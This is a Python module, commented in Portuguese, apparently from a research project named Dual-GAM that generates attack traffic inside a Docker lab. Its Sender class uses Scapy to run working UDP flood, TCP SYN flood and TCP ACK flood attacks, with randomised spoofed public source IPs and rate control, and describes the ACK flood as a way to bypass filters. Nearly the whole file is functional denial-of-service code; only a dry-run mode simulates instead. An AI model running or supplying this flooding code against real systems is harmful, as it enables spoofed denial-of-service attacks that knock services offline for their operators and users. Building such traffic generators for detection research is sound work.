"""
Dual-GAM — Sender (Scapy)

Recebe AttackParams do Translator e gera tráfego real na rede Docker.
Suporta: UDP flood, TCP SYN flood, TCP ACK flood.

Requer privilégios de root (necessário para raw sockets do Scapy).
No Docker, o container h-attack roda com NET_RAW capability.
"""

from __future__ import annotations

import logging
import random
import socket
import time
from dataclasses import dataclass, field
from typing import Optional

logger = logging.getLogger(__name__)

# Scapy importado com output suprimido
import logging as _logging
_logging.getLogger("scapy").setLevel(_logging.CRITICAL)

try:
    from scapy.all import (
        IP, TCP, UDP, Raw,
        RandShort, RandIP,
        send, sendp,
        conf as scapy_conf,
    )
    scapy_conf.verb = 0  # sem output do Scapy
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    logger.warning("Scapy não disponível — usando modo simulação")

from translator.translator import AttackParams


@dataclass
class AttackResult:
    """Resultado de uma execução de ataque."""
    params: AttackParams
    packets_sent: int
    bytes_sent: int
    duration_actual: float
    success: bool
    error: Optional[str] = None
    pps_real: float = field(init=False)
    mbps_real: float = field(init=False)

    def __post_init__(self):
        self.pps_real = self.packets_sent / max(self.duration_actual, 0.001)
        self.mbps_real = (self.bytes_sent * 8) / max(self.duration_actual, 0.001) / 1e6


class Sender:
    """
    Executa ataques DDoS usando Scapy com base nos AttackParams do Translator.

    Modos:
      - UDP flood: pacotes UDP com payload aleatório
      - TCP SYN flood: SYN sem completar handshake (esgota tabela de conexões)
      - TCP ACK flood: ACK flood para bypass de filtros
    """

    def __init__(self, iface: Optional[str] = None, dry_run: bool = False):
        """
        Args:
            iface: interface de rede (None = auto-detect)
            dry_run: se True, não envia pacotes reais (apenas loga)
        """
        self.iface = iface
        self.dry_run = dry_run or not SCAPY_AVAILABLE

        if self.dry_run:
            logger.warning("Sender em modo DRY RUN — nenhum pacote será enviado")

    def executar(self, params: AttackParams) -> AttackResult:
        """
        Executa o ataque descrito em AttackParams.
        Retorna AttackResult com métricas reais de envio.
        """
        logger.info("Iniciando ataque: %s", params)

        if self.dry_run:
            return self._simular(params)

        try:
            if params.use_tcp:
                if params.use_syn_flood:
                    return self._syn_flood(params)
                else:
                    return self._tcp_flood(params)
            else:
                return self._udp_flood(params)
        except Exception as e:
            logger.error("Erro no ataque: %s", e)
            return AttackResult(
                params=params,
                packets_sent=0,
                bytes_sent=0,
                duration_actual=0,
                success=False,
                error=str(e),
            )

    # ── Modos de ataque ────────────────────────────────────────────────────

    def _udp_flood(self, params: AttackParams) -> AttackResult:
        """UDP flood com payload aleatório e IP/porta fonte spoofados."""
        packets_sent = 0
        bytes_sent = 0
        interval = 1.0 / params.packets_per_second
        start = time.time()
        deadline = start + params.duration_seconds
        payload = b"X" * params.packet_size

        while time.time() < deadline:
            src_ip = self._random_ip() if params.randomize_src_ip else None
            src_port = random.randint(1024, 65535) if params.randomize_src_port else 12345

            pkt = (
                IP(src=src_ip, dst=params.target_ip) /
                UDP(sport=src_port, dport=params.target_port) /
                Raw(load=payload)
            )

            send(pkt, iface=self.iface, verbose=False)
            packets_sent += 1
            bytes_sent += len(pkt)

            # Rate limiting
            elapsed = time.time() - start
            expected = packets_sent * interval
            if expected > elapsed:
                time.sleep(expected - elapsed)

        duration = time.time() - start
        logger.info("UDP flood concluído: %d pkt em %.2fs", packets_sent, duration)

        return AttackResult(
            params=params,
            packets_sent=packets_sent,
            bytes_sent=bytes_sent,
            duration_actual=duration,
            success=True,
        )

    def _syn_flood(self, params: AttackParams) -> AttackResult:
        """TCP SYN flood — esgota a tabela SYN do servidor alvo."""
        packets_sent = 0
        bytes_sent = 0
        interval = 1.0 / params.packets_per_second
        start = time.time()
        deadline = start + params.duration_seconds

        while time.time() < deadline:
            src_ip = self._random_ip() if params.randomize_src_ip else None
            src_port = RandShort() if params.randomize_src_port else 12345

            pkt = (
                IP(src=src_ip, dst=params.target_ip) /
                TCP(
                    sport=src_port,
                    dport=params.target_port,
                    flags="S",
                    window=params.window_size,
                    seq=random.randint(0, 2**32 - 1),
                )
            )

            send(pkt, iface=self.iface, verbose=False)
            packets_sent += 1
            bytes_sent += len(pkt)

            elapsed = time.time() - start
            expected = packets_sent * interval
            if expected > elapsed:
                time.sleep(expected - elapsed)

        duration = time.time() - start
        logger.info("SYN flood concluído: %d pkt em %.2fs", packets_sent, duration)

        return AttackResult(
            params=params,
            packets_sent=packets_sent,
            bytes_sent=bytes_sent,
            duration_actual=duration,
            success=True,
        )

    def _tcp_flood(self, params: AttackParams) -> AttackResult:
        """TCP flood com flags configuradas (ACK, PSH, etc.)."""
        packets_sent = 0
        bytes_sent = 0
        interval = 1.0 / params.packets_per_second
        start = time.time()
        deadline = start + params.duration_seconds
        payload = b"X" * params.packet_size

        while time.time() < deadline:
            src_ip = self._random_ip() if params.randomize_src_ip else None
            src_port = random.randint(1024, 65535) if params.randomize_src_port else 12345

            pkt = (
                IP(src=src_ip, dst=params.target_ip) /
                TCP(
                    sport=src_port,
                    dport=params.target_port,
                    flags=params.tcp_flags,
                    window=params.window_size,
                ) /
                Raw(load=payload)
            )

            send(pkt, iface=self.iface, verbose=False)
            packets_sent += 1
            bytes_sent += len(pkt)

            elapsed = time.time() - start
            expected = packets_sent * interval
            if expected > elapsed:
                time.sleep(expected - elapsed)

        duration = time.time() - start
        logger.info("TCP flood concluído: %d pkt em %.2fs", packets_sent, duration)

        return AttackResult(
            params=params,
            packets_sent=packets_sent,
            bytes_sent=bytes_sent,
            duration_actual=duration,
            success=True,
        )

    # ── Helpers ────────────────────────────────────────────────────────────

    @staticmethod
    def _random_ip() -> str:
        """Gera IP público aleatório (evita ranges privados)."""
        while True:
            ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
            # Evitar RFC 1918 e outros reservados
            if not (
                ip.startswith("10.")
                or ip.startswith("192.168.")
                or ip.startswith("172.16.")
                or ip.startswith("127.")
            ):
                return ip

    def _simular(self, params: AttackParams) -> AttackResult:
        """Modo dry run: simula o ataque sem enviar pacotes."""
        n = int(params.packets_per_second * params.duration_seconds)
        size = params.packet_size
        logger.info(
            "[DRY RUN] Simulando %d pacotes de %dB para %s:%d",
            n, size, params.target_ip, params.target_port,
        )
        time.sleep(min(params.duration_seconds, 1.0))  # simula delay
        return AttackResult(
            params=params,
            packets_sent=n,
            bytes_sent=n * size,
            duration_actual=params.duration_seconds,
            success=True,
        )
